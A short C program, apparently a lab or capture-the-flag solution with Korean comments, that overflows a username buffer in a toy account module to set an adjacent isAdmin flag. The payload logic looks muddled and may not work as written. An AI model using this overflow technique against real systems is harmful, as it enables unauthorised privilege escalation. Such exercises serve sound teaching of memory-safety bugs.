#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "code.h"

int main() {
    int user_id = create_user_account(false, "pwned");

    printf("Before:\n");
    printf("[*] username : %s\n", username(user_id));
    printf("[*] isAdmin  : %d\n", is_admin(user_id));

    // exploit: overflow username to overwrite isAdmin
    // isAdmin은 username 뒤쪽 메모리니까 overflow 가능
    char payload[100];
    memset(payload, 'A', MAX_USERNAME_LEN);   // fill username
    payload[MAX_USERNAME_LEN] = '\0';

    // 새로운 문자열로 덮어쓰기 시도
    // 이 과정에서 username 버퍼를 넘어서 isAdmin 값을 수정하게 됨
    update_username(user_id, "\x01", payload);  // '\x01'은 isAdmin = true가 되도록

    printf("After:\n");
    printf("[*] username : %s\n", username(user_id));
    printf("[*] isAdmin  : %d\n", is_admin(user_id));

    return 0;
}
